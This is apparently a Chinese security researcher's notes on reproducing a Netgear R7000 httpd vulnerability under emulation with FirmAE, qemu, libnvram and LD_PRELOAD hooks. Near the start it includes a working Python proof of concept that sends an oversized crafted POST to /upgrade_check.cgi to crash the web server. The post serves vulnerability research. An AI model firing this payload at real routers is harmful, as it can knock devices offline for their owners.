参考于文章[复现影响79款Netgear路由器高危漏洞](https://blog.csdn.net/q759451733/article/details/114459181)，但原文章是基于真实设备做的，这里尝试采用模拟的方式。

刚开始尝试qemu用户仿真，会报错说`libbdbroker.so`找不到
```
sudo chroot . ./qemu-arm-static /usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
/usr/sbin/httpd: can't load library 'libbdbroker.so'
```

然后去文件系统中找，这里会出现各种各种符号链接，但是是坏的，在提取的文件系统里确实找不到这个`libbdbroker.so`文件，这应该是路由器启动过程中动态生成的文件。

于是尝试使用FirmAE进行仿真，可以成功仿真！
```
sudo ./run.sh -d Netgear /home/iot/Desktop/firmware/Netgear/R7000-V1.0.11.100_10.2.100/R7000-V1.0.11.100_10.2.100.chk
```

![](images/Pasted%20image%2020230918224258.png)

通过debug模式进入shell，在FirmAE仿真的文件系统里可以找到`libbdbroker.so`文件，并且运行poc代码可以让http服务崩溃。
```python
# poc.py
import socket

ip = '192.168.1.1'
port = 80
argument_name = b"mtenFWUpload"

def send_plain(ip, port, payload):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	print(sock.recv(4096))
	sock.close()

data = b""
data += b"*#$^\x00" # marker
data += b"\x00\x04\x00" # size
data += b"A" * 0x400

payload = b''
payload += b'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += b'Host: 192.168.1.1\r\n'
payload += b'Content-Disposition: AAAA\r\n'
payload += b'Content-Length: 1024\r\n'
payload += b'Content-Type: application/octet-stream\r\n'
payload += b'name="mtenFWUpload"\r\n'
payload += b'\r\n'
payload += data

print(payload)

send_plain(ip, port, payload)

```

## 仿真
由于项目需要，要尝试将httpd程序通过用户仿真方式跑起来并能够触发崩溃，查看固件支持的命令发现支持tftp，于是在主机搭建tftp服务器，把缺少的`libbdbroker.so`文件拷贝出来再尝试运行。（后来发现该文件可以在文件系统中一个打包文件中找到）
### 搭建tftp服务器

在ubuntu主机上安装服务端
```
sudo apt-get install tftpd-hpa
```

创建tftp服务器目录
```
cd /home/iot/Desktop
mkdir tftp_share
```

配置tftp服务器
```
sudo vim /etc/default/tftpd-hpa
```

将内容更改为如下内容：
```
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/home/iot/Desktop/tftp_share"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="-l -c -s"
```

重启tftp服务
```
sudo service tftpd-hpa restart
```

在FirmAE跑起来的固件环境shell中运行tftp命令传输文件
```
tftp -l /tmp/media/nand/bitdefender/patches/base/lib/libbdbroker.so -r libbdbroker.so  -p 192.168.1.2 69
```

然后在tftp配置的目录下就可以找到相应的文件。

将`libbdbroker.so`文件放在lib目录下，然后再以用户仿真运行httpd程序，这次报`/var/run/httpd.pid: No such file or directory`，原因是缺少相应的目录，创建对应目录即可。提取的文件系统var指向tmp/var（不存在），所以递归创建目录`tmp/var/run`，然后再运行。

这次就开始报`/dev/nvram: No such file or directory`，这是因为没有配置nvram，可以安装firmadyne项目中提供的方法进行配置。

### nvram配置
根据[firmadyne/libnvram: NVRAM emulator (github.com)](https://github.com/firmadyne/libnvram) 中Usage的描述，下载arm版本的release，将`libnvram.so`覆盖原来的文件`usr/sbin/libnvram.so`，在文件系统根目录创建目录
```
mkdir -p firmadyne/libnvram/
mkdir -p firmadyne/libnvram.override/
```

然后重新启动httpd程序，nvram问题解决了，但是又崩了。

![](images/Pasted%20image%2020230919113506.png)

刚开始没找出原因在哪儿，然后尝试通过greenhouse工具跑该固件，但是跑完后没有结果。后来又尝试全系统模式仿真，测试发现上面的问题是因为NVRAM的值（`gui_region`）没有设置，需要设置它的值才能继续跑下去，但是后面还有很多NVRAM的值需要设置，暂时还是没跑起来，记录一下全系统仿真时的脚本。

```
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

./gdbserver-7.7.1-armel-v1 192.168.2.2:1234 usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
```

由于FirmAE能够成功仿真，我们可以将其仿真成功时的NVRAM配置拷贝出来作为用户仿真状态下的配置。拷贝出来后发现一个问题，从[firmadyne/libnvram](https://github.com/firmadyne/libnvram)这里下载的libnvram.so有点问题，正常情况下，可以把初始的nvram配置放在/firmadyne/libnvram.override文件夹下，后续会拷贝到实际使用的/firmadyne/libnvram文件夹下，但是下载的libnvram.so却拷贝到了/libnvram文件夹下，而使用的是/firmadyne/libnvram文件夹，从而使override的初始提供的值无效。后来我对其进行了修改，使其直接使用/libnvram文件夹下的值。

具体过程就是：将FirmAE环境拷贝出的libnvram目录内容放入/firmadyne/libnvram.override文件夹下，创建/libnvram，在运行时会将/firmadyne/libnvram.override文件夹下的值拷贝到使用的/libnvram中。

### 外设访问错误

解决完nvram问题，还是会崩溃。有很多访问`/dev/acos_nat_cli`外设的，还会调用`ioctl()`函数操作，无法处理，导致崩溃，主要封装为类似`agApi_*` 的函数。在FirmAE的论文中，有相关的描述：

> 嵌入式设备中的很多程序通过内核设备驱动程序与外设协作。通常，其使用ioctl命令行与外设通信。但因为每个设备驱动程序都有其独特的特征，这些特征取决于其开发人员和相应的设备，所以这一过程并不容易模拟。尽管Firmadyne实现了一些虚拟内核模块，支持/dev/naram和/dev/acos_nat_cli，但这远远无法涵盖实际场景中中固件映像的各种特性。所以，这一问题会导致很多固件映像仿真过程中崩溃。 

> **Insufficient support of kernel module**尽管Firmadyne用硬编码设备名称和icotl命令实现了虚拟模块，但当程序用不同的配置来访问内核时还是会失败。例如，大量的NETGEAR映像使用acos_nat模块来与安装在/dev/acos_nat_cli上的外设通信。在这些映像中，Firmadyne模块返回不正确的值，并在httpd中形成无限循环。此外，我们还发现ioctl命令根据固件体系结构的不同而不同，这一点也需要考虑进来。

> FirmAE的高级仿真方法可以利用特定内核模块的优势。这里关键的一点是通过共享库来访问许多内核模块，这些共享库有发送相应ioctl命令的函数。因此，FirmAE可以像处理NVRAM问题一样对其处理。当程序调用库函数时，FirmAE返回一个预定义的值。因此，并不需要模拟每个设备架构中的每一条icotl命令。在这个例子中，我们只需要关注acos_nat，而经由共享库的其他外设访问可以用相同的方式处理。

对此，我尝试进行Hook。要Hook需要编译so文件，需要先下载交叉编译工具：[armv7-eabihf--uclibc--stable-2020.08-1](https://toolchains.bootlin.com/downloads/releases/toolchains/armv7-eabihf/tarballs/armv7-eabihf--uclibc--stable-2020.08-1.tar.bz2)

编写函数hook.c，对open函数进行hook
```
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

int open(const char *file, int oflag, ...)
{
	fprintf(stderr, "hook open func!!\n");
	char str1[] = "/dev/acos_nat_cli";
	if(strcmp(str1, file) == 0){
		// 1==2
		fprintf(stderr, "return open 1 !!\n");
		return 1;
	}else{
		fprintf(stderr, "try call open !!\n");
		typeof(&open) orig = dlsym(RTLD_NEXT, "open");
		return orig(file, oflag);
	}
	return 1;
}
```

然后编译
```
armv7-eabihf--uclibc--stable-2020.08-1/bin/arm-linux-gcc hook.c -o hook.so  -fPIC -shared -ldl
```

运行
```
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./hook.so usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
```

可以运行起来，发现PoC也可以触发崩溃，但还是存在很多问题。比如页面返回结果不对，存在daemon fork等。

调试命令
```
sudo chroot . ./qemu-arm-static -g 1234 -E LD_PRELOAD=./hook.so usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem

set follow-fork-mode parent
```

### daemon
其存在daemon，在调试的时候调试一半就结束了，但程序还在跑。后来将daemon hook掉进行调试，发现跑到sslwrite函数处理的时候报错了。启动httpd不加参数，到另一个地方又报错了。总之不能平稳的运行调试起来。

```
int daemon(int nochdir, int noclose)
{
	fprintf(stderr, "hook daemon func!!\n");
	return 1;
}
```